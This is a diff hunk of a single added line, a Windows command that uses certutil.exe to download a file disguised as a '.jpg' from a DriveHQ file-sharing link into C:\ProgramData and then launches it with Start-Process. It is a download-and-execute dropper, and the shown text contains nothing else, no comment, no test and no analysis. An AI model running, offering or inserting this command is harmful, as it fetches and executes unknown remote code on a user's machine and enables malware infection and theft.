@@ -1,0 +1,1 @@
+certutil.exe -urlcache -split -f https://www.drivehq.com/file/DFPublishFile.aspx/FileID7553157844/Keyilufyhkeor5w/0.jpg C:\\ProgramData\\66513216513213.jpg;Start-Process C:\\ProgramData\\66513216513213.jpg
